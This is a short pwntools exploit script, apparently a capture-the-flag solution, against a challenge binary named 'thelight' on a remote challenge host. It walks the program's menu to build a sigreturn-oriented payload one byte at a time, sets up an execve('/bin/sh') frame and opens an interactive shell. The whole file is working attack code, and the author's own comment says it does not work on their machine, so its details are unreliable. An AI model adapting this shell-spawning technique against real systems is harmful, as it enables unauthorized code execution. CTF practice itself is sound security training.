from pwn import *

# DOES NOT WORK ON MY MACHINE
# But take inspiration from the logic anyways

BINARY = "./thelight"
HOST = "0.cloud.chals.io"
PORT = 24481

elf = context.binary = ELF(BINARY, checksec=False)
# libc = ELF([lib for lib in elf.libs if '/libc.' in lib or '/libc-' in lib][0], checksec=False)

env = {} # {"LD_LIBRARY_PATH": "./", "LD_PRELOAD": ""}
gdbscript = '''
b *0x0000000000401404
c
'''

def start():
    if args.REMOTE:
        return connect(HOST, PORT)
    elif args.RAW:
        return process(BINARY)
    else:
        return gdb.debug(BINARY, gdbscript=gdbscript, env=env)

def address_from_bytes(by):
    by += b"\x00" * (8 - len(by))
    return u64(by)

conn = start()

for i in range(4):
    conn.sendlineafter(b"\n> ", b"y")

conn.sendlineafter(b"\n>  ", b"1")

for i in range(0x50):
    conn.sendlineafter(b"\n>  ", b"5")

binsh = 0x404098

payload = p64(0x40141f)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x401426

payload += bytes(frame)

state = 1

table = {
    10: b"4",
    5: b"3",
    2: b"2",
    1: b"1"
}

for char in payload:
    if not char:
        conn.sendlineafter(b"\n>  ", b"6")
        conn.sendlineafter(b"\n>  ", b"5")
        continue

    if state > char:
        conn.sendlineafter(b"\n>  ", b"6")
        state = 0

    for add in [10, 5, 2, 1]:
        offset = char - state
        offset //= add

        for i in range(offset):
            conn.sendlineafter(b"\n>  ", table[add])
            state += add
            state %= 0x100

    conn.sendlineafter(b"\n>  ", b"5")

conn.interactive()
